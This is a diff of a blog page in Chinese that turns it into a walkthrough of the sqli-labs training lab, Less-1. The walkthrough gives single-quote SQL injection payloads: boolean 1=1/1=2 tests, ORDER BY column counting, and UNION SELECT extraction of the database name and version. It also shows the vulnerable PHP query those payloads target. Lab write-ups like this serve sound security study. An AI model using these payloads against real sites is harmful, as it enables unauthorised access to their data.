@@ -9,7 +9,7 @@
 	
 	<title>
 	
-		page | 
+		sqli-labs | 
 	 
 	ZeroP
 	</title>
@@ -166,7 +166,7 @@ var _hmt = _hmt || [];
 							</ul>
 			
 							<ul>
-								<li class="file active">
+								<li class="file">
 									<a href="/ZeroP/2021/09/17/WEB%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/">
 										命令注入
 									</a>
@@ -199,7 +199,7 @@ var _hmt = _hmt || [];
 							</ul>
 			
 							<ul>
-								<li class="file">
+								<li class="file active">
 									<a href="/ZeroP/2021/10/02/%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/sqli-labs/">
 										sqli-labs
 									</a>
@@ -219,12 +219,12 @@ var _hmt = _hmt || [];
 	<div id="content">
 		<h1 id="article-title">
 
-	命令注入
+	sqli-labs
 </h1>
 <div class="article-meta">
 	
 	<span>ZeroP零点</span>
-	<span>2021-09-17 12:53:29</span>
+	<span>2021-10-02 11:13:48</span>
 		<div id="article-categories">
     
 		<span>Categories：</span>
@@ -234,29 +234,61 @@ var _hmt = _hmt || [];
     
 		<span>Tags：</span>
             
+                
+                    <span>
+                        <i class="fa fa-tag" aria-hidden="true">
+                        <a href="/tags/SQL注入-靶场/">SQL注入 | 靶场</a>
+                        </i>
+                    </span>
+                
+            
     
 		</div>
 
 </div>
 
 <div id="article-content">
-	
+	<h2 id="SQL-Injections-Page-1">SQL Injections Page 1</h2>
+<h3 id="Error-based-Single-quotes-String-Less-1">Error based - Single quotes -String Less-1</h3>
+<p>此注入为单引号报错注入，需要闭合引号<code>'</code>=<code>%27</code></p>
+<pre><code class="highlight mysql">sqli-labs/Less-1/?id=1%27 and 1=1 -- -   #正常显示
+sqli-labs/Less-1/?id=1%27 and 1=2 -- -   #无返回结果</code></pre>
+<p>至于为什么使用单引号闭合，如下：</p>
+<pre><code class="highlight php"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>; <span class="comment">#直接吧id后面的1&#x27; and 1=2 -- - 放在$id的位置，所以就如下面这个语句$sql2</span>
+
+<span class="variable">$sql2</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;1&#x27; and 1=2 -- - &#x27; LIMIT 0,1&quot;</span>; <span class="comment">#`--`可以将后面的语句进行注释</span>
+<span class="comment">#所以最后的sql语句就成了 `SELECT * FROM users WHERE id=&#x27;1&#x27; and 1=2` </span>
+<span class="comment">#如果不闭合单引号就会成为id=&#x27;1 and 1=2</span></code></pre>
+<p>然后就是爆字段数、显位</p>
+<pre><code class="highlight mysql">#爆字段数
+?id=1%27 order by 3 #不报错
+?id=1%27 order by 4 #报错，说明字段数为3
+
+#爆显位
+?id=-1%27 union select 1,2,3 #如下图less-1-1，注意此时需要查询不到相应的数据，所以使用-1</code></pre>
+<p><img src="https://s1.imagehub.cc/images/2021/10/02/image.png" alt="image.png"></p>
+<center>【less-1-1】</center>
+<p>接下来就是爆数据库名，版本信息，表名，字段名，字段具体数据了，后面基本没啥难度，就是简单的注入，下图less-1-2是爆数据库名和版本信息，具体代码如下：</p>
+<pre><code class="highlight mysql">?id=-1%27 union select 1,database(),version() -- -</code></pre>
+<p><img src="https://s1.imagehub.cc/images/2021/10/02/imagef6ec6c193860368c.png" alt="imagef6ec6c193860368c.png"></p>
+<center>【less-1-2】</center>
+
 </div>
 
 
     <div class="post-guide">
         <div class="item left">
             
-              <a href="/ZeroP/2021/10/02/%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/sqli-labs/">
+              <a href="/ZeroP/2021/10/02/%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/fileupload-labs/">
                   <i class="fa fa-angle-left" aria-hidden="true"></i>
-                  
+                  fileupload-labs
               </a>
             
         </div>
         <div class="item right">
             
-              <a href="/ZeroP/2021/09/16/WEB%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/SQL%E6%B3%A8%E5%85%A5/00%20SQL%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%AE%BA/">
-                SQL注入
+              <a href="/ZeroP/2021/09/17/WEB%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/">
+                注入攻击
                 <i class="fa fa-angle-right" aria-hidden="true"></i>
               </a>
             
